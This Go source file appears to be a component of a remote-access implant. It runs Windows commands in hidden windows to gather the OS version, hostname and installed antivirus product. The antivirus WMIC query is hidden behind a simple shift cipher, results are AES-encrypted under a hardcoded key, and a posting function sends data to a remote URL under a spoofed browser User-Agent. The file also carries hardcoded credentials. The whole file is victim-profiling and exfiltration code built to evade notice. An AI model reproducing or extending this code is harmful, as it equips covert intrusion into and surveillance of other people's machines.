package methods

import (
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"syscall"
	"unicode"
)

var (
	Username2 = "ADMIN"
	Password2 = "1223"
)

func Sendpost(URL, MENSAJE string) error {

	datos := strings.NewReader(MENSAJE)
	res, err := http.Post(URL, "application/x-www-form-urlencoded", datos)
	userAGent := `Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 `
	res.Header.Set("User-Agent", userAGent)
	if err != nil {
		log.Fatal(err)
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%s", body)

	return nil
}

func stripSpaces(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}

func GetOS() string {
	Info := exec.Command("cmd", "/C", "ver")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(string(aesgo.EncryptAes(string(History), "5345435454535")))
}

func GetHostname() string {
	Info := exec.Command("cmd", "/C", "hostname")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(string(aesgo.EncryptAes(string(History), "5345435454535")))
}

func DEFOBF(Data string) string {
	var ClearText string
	for i := 0; i < len(Data); i++ {
		ClearText += string(int(Data[i]) - 1)
	}
	return ClearText
}

func GetAntiVirus() string {
	Info := exec.Command("cmd", "/C", DEFOBF("XNJD!0Opef;mpdbmiptu!0Obnftqbdf;]]sppu]TfdvsjuzDfoufs3!Qbui!BoujWjsvtQspevdu!Hfu!ejtqmbzObnf!0Gpsnbu;Mjtu"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	if strings.Contains(string(History), "=") {
		AV := strings.Split(string(History), "=")
		return stripSpaces(string(AV[1]))
	} else {
		return stripSpaces(string(aesgo.EncryptAes(string(History), "5345435454535")))
	}
}
